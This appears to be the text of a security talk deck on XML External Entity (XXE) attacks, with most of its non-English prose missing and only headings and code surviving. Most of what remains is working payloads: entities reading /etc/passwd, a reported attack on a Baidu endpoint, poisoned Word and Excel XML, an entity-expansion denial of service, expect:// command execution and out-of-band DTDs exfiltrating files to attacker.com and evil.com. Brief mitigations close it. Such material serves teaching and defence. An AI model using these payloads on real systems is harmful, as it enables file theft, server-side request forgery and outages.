XML

(pnig0s)@Alibaba


· P|| ·  · FreeBuf ·  · xKungFoo,xDef · GoogleYahooEbayTwitterYandexEvernote
 · WebWebR&D

XML

XML
<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE UserInfo [ <!ENTITY name SYSTEM"file:///etc/passwd"> ]> <UserInfo>
<name>&name;</name> </UserInfo>

XML
· RSS,ATOM,OpenDocument,XMLRPC,SOAP,SAML,SVG,XML import,etc
·  · 
XML · 

RSSATOMMailchimp
 10 RSS 

SVG Converter
SVG

XML ImportZabbix
 XML

wooyun-2010-058381 XXE

wooyun-2010-058381
POST /data/mobile/chart/save HTTP/1.1 Host: tongji.baidu.com

wooyun-2010-058381
["<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE svg[<!ENTITY test SYSTEM \"file:///etc/passwd\">]><svg style=\"overflow: hidden; position: relative;\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" width=\"730\" version=\"1.1\" height=\"880\"><path transform=\"matrix(1,0,0,1,0,0)\" fill=\"#eaedf2\" stroke=\"none\" d=\"5Z\"></path><text transform=\"matrix(1,0,0,1,0,0)\" x=\"0\" y=\"42\" width=\"730\" height=\"2000\" text-anchor=\"start\" font=\"12px Arial\" stroke=\"none\" fill=\"#4b5473\" fontsize=\"12px\"><tspan dy=\"10.903846153846155\">&test;</tspan></text></svg>"]

wooyun-2010-058381

XXE
 RSS

XXE

XXE
etc

DOC

QQXXE
DOC

QQXXE
/word/document.xml:
<?xml version="1.0" encoding="UTF-8" standalone="yes"?> <w:document> <w:body><w:p w:rsidR="00221056" w:rsidRDefault="000B15BC"><w:pPr><w:rPr><w:rFonts w:hint="eastAsia"/></w:rPr></w:pPr><w:r><w:rPr><w:rFonts w:hint="eastAsia"/></w:rPr><w:t></w:t></w:r><w:r><w:t> </w:t></w:r><w:bookmarkStart w:id="0" w:name="_GoBack"/><w:bookmarkEnd w:id="0"/></w:p><w:sectPr w:rsidR="00221056"><w:pgSz w:w="11906" w:h="16838"/><w:pgMar w:top="1440" w:right="1800" w:bottom="1440" w:left="1800" w:header="851" w:footer="992" w:gutter="0"/><w:cols w:space="425"/><w:docGrid w:type="lines" w:linePitch="312"/></w:sectPr></w:body> </w:document>

/word/document.xml:

QQXXE

<?xml version="1.0" encoding="UTF-8" standalone="yes"?> <!DOCTYPE w[ <!ENTITY xxe SYSTEM"file:///etc/passwd"> ]> <w:document> <w:body><w:p w:rsidR="00221056" w:rsidRDefault="000B15BC"><w:pPr><w:rPr><w:rFonts w:hint="eastAsia"/></w:rPr></w:pPr><w:r><w:rPr><w:rFonts w:hint="eastAsia"/></w:rPr><w:t>&xxe;</w:t><w:bookmarkStart w:id="0" w:name="_GoBack"/><w:bookmarkEnd w:id="0"/></w:p><w:sectPr w:rsidR="00221056"><w:pgSz w:w="11906" w:h="16838"/><w:pgMar w:top="1440" w:right="1800" w:bottom="1440" w:left="1800" w:header="851" w:footer="992" w:gutter="0"/><w:cols w:space="425"/><w:docGrid w:type="lines" w:linePitch="312"/></w:sectPr></w:body> </w:document>



QQXXE

Excel

QQXXE
Excel

QQXXE
xl/sharedStrings.xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?> <!DOCTYPE t [ <!ENTITY xxe SYSTEM "file:///etc/network/interfaces"> ]> <sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/m ain" count="1" uniqueCount="1"><si><t>&xxe;</t><phoneticPr fontId="1" type="noConversion"/></si></sst>

QQXXE

XML

XML
·  ·  ·  ·  ·  ·  ·  · ......

DOS

· /dev/zero · /dev/random · XML Entity Boom

<?xml version="1.0" encoding="UTF8"?> <!DOCTYPE UserInfo [ <!ENTITY name SYSTEM "file:///dev/random"> ]> <UserInfo>
<name>&name;</name> </UserInfo>

DoS -- XML Entitiy BOOM
<!DOCTYPE UserInfo [ <!ENTITY lol "lol"> <!ENTITY lol2
"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"> <!ENTITY lol3
"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"> <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;"> ....... ........ <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;"> ]> <UserInfo>&lol9;</UserInfo>

DoS -- XML Entitiy BOOM

Java
Groovy def xxePoc = ' <?xml version="1.0"?><!DOCTYPE customer[<!ENTITY name SYSTEM "file:///">]><customer><name>&name;</name></customer>' def xmlParser = new XmlSlurper(); def parsedContent = xmlParser.parseText(xxePoc) println parsedContent

Java

<!DOCTYPE UserInfo [ <!ENTITY name SYSTEM "http://127.0.0.1:22/">]> <UserInfo>
<name>&name;</name> </UserInfo>





jar
Javajarjar 1. jar 2. jar 3.  jar:http://host/evil.jar!/file/in/the/jar
 1. jar 2. jar 3.  4. 

<!DOCTYPE UserInfo [ <!ENTITY name SYSTEM " jar:http://127.0.0.1:2014/!/">]> <UserInfo>
<name>&name;</name> </UserInfo>

jar

jar
HTTP/1.0 200 OK Content-Type: application/java-archive Date: Sat Aug 09 04:31:39 EDT 2014 Server: EvilServer 1.0
This file was uploaded from the attacker server.

<!DOCTYPE root [<!ENTITY foo SYSTEM "expect://id">]> <methodCall> <methodName>&foo;</methodName> </methodCall>



PHPExpect pecl install expect

<methodResponse> <fault><value><struct> <member> <name>faultString</name> <value> <string>Method &uid=0(root) gid=0(root) groups=0(root)&quot; does not exist</string> </value> </member> </struct></value></fault> </methodResponse>

XXE OOB


· OOBOut-Of-Band
 
· Parameter Entity
XML  <!ENTITY % name "foo"> <!ENTITY copyright "copyright © 2008, %name;.cn, ALL Right Reserved "> 1DTD 2

evil.xml
<!DOCTYPE root [ · <!ENTITY % file SYSTEM
"file:///etc/hosts"> <!ENTITY % dtd SYSTEM "http://attacker.com/ext.dtd"> %dtd; %send; ]]> <zabbix_export> </zabbix_export>

HTTP
`%' 16 &#37;&#x25;

ext.dtd:

<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?%file;'>" >%all;

HTTP
PHPphp://filter php://filter/read=convert.base64-encode/resource=/etc/hosts
MjcuMC4wLjEJbG9jYWxob3N0CjEyNy4wLjEuMQlrYWxpCgojIFR oZSBmb2xsb3dpbmcgbGluZXMgYXJlIGRlc2lyYWJsZSBmb3IgSV B2NiBjYXBhYmxlIGhvc3RzCjo6MSAgICAgbG9jYWxob3N0IGlwNi 1sb2NhbGhvc3QgaXA2LWxvb3BiYWNrCmZmMDI6OjEgaXA2LW FsbG5vZGVzCmZmMDI6OjIgaXA2LWFsbHJvdXRlcnMK

evil.xml
<!DOCTYPE a [ <!ENTITY % asd SYSTEM
"http://attacker.com/ext.dtd"> %asd; %c; %rrr;
]> <a></a>

FTP

ext.dtd
<!ENTITY % b SYSTEM " php://filter/read=convert.base64-encode/resource= file:///etc/passwd"> <!ENTITY % c "<!ENTITY &#37; rrr SYSTEM 'ftp://evil.com:8000/%b;'>">

FTP

GopherJava 1.6
Gopher gopher://{host}:{port}/{type}{request} · type · requestURL

GopherJava 1.6

<!DOCTYPE roottag [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % dtd SYSTEM "http://attacker.com/ext.dtd"> %dtd;]>

ext.dtd

<!ENTITY % all "<!ENTITY send SYSTEM 'gopher://attacker.com:1337/1%file;' >"> %all;

NC nc ­lnp 1337



evil.xml

<!DOCTYPE test [ <!ENTITY % one SYSTEM
"https://attacker.com/ext.dtd" > %one; %two; %four;
]>

ext.dtd

<!ENTITY % three SYSTEM "file:///c:/windows/win.ini"> <!ENTITY % two "<!ENTITY % four SYSTEM 'file:///%three;'>">



XML

XML
· XMLDOCTYPE
­ XML_DOCUMENT_TYPE_NODE
· DOCTYPE
­ libxml_disable_entity_loader(true); //PHP
· Libxml
­ Libxml2.9XML ­ libxmlapt-cache show libxml2 | grep Version

Contact
@pnig0s pnig0s@freebuf.com
Thanks!
www.pnigos.com

